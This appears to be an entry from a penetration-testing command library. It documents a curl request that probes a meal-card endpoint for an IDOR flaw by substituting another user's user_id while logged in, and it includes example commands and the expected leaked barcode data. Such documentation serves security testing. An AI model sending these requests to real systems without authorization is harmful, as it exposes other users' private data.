---
data: >-
  curl -X GET "https://example.com/meal-card?user_id=TARGET_USER_ID" -H "Cookie:
  session=your_session_cookie" -v
tags:
  - web
  - recon
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: fa9913d0-5c97-47ff-a051-2a260c1ca2b1
created_at: '2025-12-14T17:25:29.322Z'
updated_at: '2025-12-14T17:25:29.322Z'
verified: false
validated: true
submitted: true
---
# curl-modify-user-parameter

## Command

```bash
curl -X GET "https://example.com/meal-card?user_id=TARGET_USER_ID" -H "Cookie: session=your_session_cookie" -v
```

## Description

This command uses curl to send a GET request to a web endpoint with a modified user_id parameter, testing for IDOR vulnerabilities by attempting to access another user's data while authenticated.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `https://example.com/meal-card?user_id=TARGET_USER_ID` | The endpoint URL with the manipulated user_id parameter | Yes |
| `-H "Cookie: session=your_session_cookie"` | Authentication header using session cookie | Yes |
| `-v` | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://example.com/meal-card?user_id=456" -H "Cookie: session=abc123"
```

### Advanced Usage

```bash
curl -X GET "https://example.com/meal-card?user_id=456" -H "Cookie: session=abc123" -H "User-Agent: Mozilla/5.0" -v -o response.html
```

## Expected Output

A successful response (HTTP 200) will return HTML or JSON with the target user's meal card details, such as {"barcode": "BC123456", "expiration": "2025-12-31"}. Verbose mode shows headers and any errors like 403 Forbidden if authorization fails.

## Related

- [[Related Procedure: Exploit-IDOR-in-Meal-Card-Endpoint]]
